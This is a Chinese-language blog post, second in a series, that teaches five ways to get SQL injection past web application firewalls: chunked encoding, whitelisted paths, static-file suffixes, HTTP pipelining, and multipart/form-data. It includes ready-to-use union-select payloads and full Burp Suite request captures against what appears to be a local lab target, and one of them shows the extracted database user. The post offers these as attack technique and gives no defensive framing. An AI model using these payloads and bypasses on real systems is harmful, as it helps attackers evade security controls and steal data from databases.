---
layout: post
title: SQL注入绕过二
categories: 网络安全
description: SQL注入绕过
keywords: SQL注入绕过
---

SQL注入绕过技术二



### 1、分块传输绕过

分块传输编码（Chunked transfer encoding）是只在 HTTP 协议 1.1 版本（HTTP/1.1）中提供的一种数据传送机制。以往 HTTP 的应答中数据是整个一起发送的，并在应答头里 Content-Length 字段标识了数据的长度，以便客户端知道应答消息的结束。

传统的 Content-length 解决方案：计算实体长度，并通过头部告诉对方。浏览器可以通过 Content-Length 的长度信息，判断出响应实体已结束。

在http头部加入 Transfer-Encoding: chunked 之后，就代表这个报文采用了分块编码。

分块传输每一个块的开头都有一个十六进制的数,表明这个块的大小，然后接 CRLF("\r\n")。然后是数据本身，数据结束后，还会有CRLF("\r\n")两个字符。有一些实现中，块大小的十六进制数和 CRLF 之间可以有空格。最后一块的块大小为 0，表明数据发送结束。最后一块不再包含任何数据，但是可以发送可选的尾部，包括消息头字段。

使用burp suite抓包然后进行修改头部，把一个正常的请求，添加一个头信息，修改为分块传输，然后修改数据的格式为分块传输的格式

```txt
假设请求体为： id=1&submit=1
修改格式
3
id=
1
&
7
submit=
1
1
0
 
 
```

第一行是长度 第二行是字符串这个长度的字符串， 0 表示传输结束 后面跟上两个空格。

也可以使用 burpsuite 的插件 chunked-coding-converter 进行编码提交

修改编码后可以提交注入语句

```txt
id=1 union select 1, user() --+
```

### 2、信任白名单绕过

有些 WAF 会自带一些文件白名单，对于白名单 waf 不会拦截任何操作，所以可以利用这个特点，可以试试白名单绕过。

白名单通常有目录：

```txt
/admin
/phpmyadmin
/admin.php
```

构建攻击语句

```txt
sqli_str.php?name=1&submit=1

修改为：
sqli_str.php?id=/admin.php?&name=' union select 1,user()--+&submit=1

sqli_str.php/phpmyadmin?name=' union select 1,user()--+&submit=1
```

### 3、静态文件绕过

除了白名单信任文件和目录外，还有一部分 waf 并不会对静态文件进行拦截。例如 图片文件 jpg 、png 、gif 或者 css 、js 会对这些静态文件的操作不会进行检测从而绕过 waf 拦截。

构建攻击语句

```txt
xxx.php?id=1.png&name=' union select 1,user()--+
xxx.php?id=1.js&name=' union select 1,user()--+
```

### 4、pipline绕过

http 协议是由 tcp 协议封装而来，当浏览器发起一个 http 请求时，浏览器先和服务器建立起连接tcp连接，然后发送http数据包（即我们用burpsuite截获的数据），其中包含了一个 Connection 字段，一般值为 close，apache 等容器根据这个字段决定是保持该 tcp 连接或是断开。当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成 keep-alive，即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束 Connection 为 close 为止

用 burpsuite 抓包提交 复制整个包信息放在第一个包最后，把第一个包 close 改成 keep-alive 把 brupsuite 自动更新 Content-Length 勾去掉。

第一个包参数的字符要加上长度接着提交即可。有些 waf 会匹配第二个包的正属于正常参数，不会对第一个包的参数进行检测，这样就可以绕过一些 waf 拦截。

burpsuite抓包及修改后的样子

```txt
# 抓到的包发送到Repeater的样子
POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.3.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://192.168.3.16
Connection: close
Referer: http://192.168.3.16/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=h583vnr6md9btmkcn2q5er52h3
Upgrade-Insecure-Requests: 1

id=1&submit=1

# 修改为

POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.3.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://192.168.3.16
Connection: keep-alive
Referer: http://192.168.3.16/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=h583vnr6md9btmkcn2q5er52h3
Upgrade-Insecure-Requests: 1

id=-1+union+select+1,user()--+&submit=1POST /06/vul/sqli/sqli_id.php HTTP/1.1
Host: 192.168.3.16
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://192.168.3.16
Connection: close
Referer: http://192.168.3.16/06/vul/sqli/sqli_id.php
Cookie: PHPSESSID=h583vnr6md9btmkcn2q5er52h3
Upgrade-Insecure-Requests: 1

id=1&submit=1

# 还需要修改burp suite的菜单栏的 Repeater=>Update-Content-Length 把这个选项的勾取消
# 然后点击发送
# 就可以搜到这些被注入出来的内容了 <p class='notice'>hello,1 <br />your email is: root@localhost</p>
```

### 5、利用 multipart/form-data 绕过

在 http 头里的 Content-Type 提交表单支持三种协议

1. application/x-www-form-urlencoded 编码模式 post 提交
2. multipart/form-data 文件上传模式
3. text/plain 文本模式

文件头的属性 是传输前对提交的数据进行编码发送到服务器。其中 multipart/form-data 表示该数据被编码为一条消息，页上的每个控件对应消息中的一个部分。所以，当 waf 没有规则匹配该协议传输的数据时可被绕过。

```txt
#头信息的关键部分
Content-Type: multipart/form-data;boundary=---------------------------28566904301101419271642457175

# boundary：28566904301101419271642457175 这个值是随机值，随便，但是要和下面保持一致

# 请求体的部分
---------------------------28566904301101419271642457175
Content-Disposition: form-data; name="id"
-1 union select 1,user()
---------------------------28566904301101419271642457175
Content-Disposition: form-data; name="submit"
submit
---------------------------28566904301101419271642457175
```

如果没有检测这个可能性的话，可以进行注入
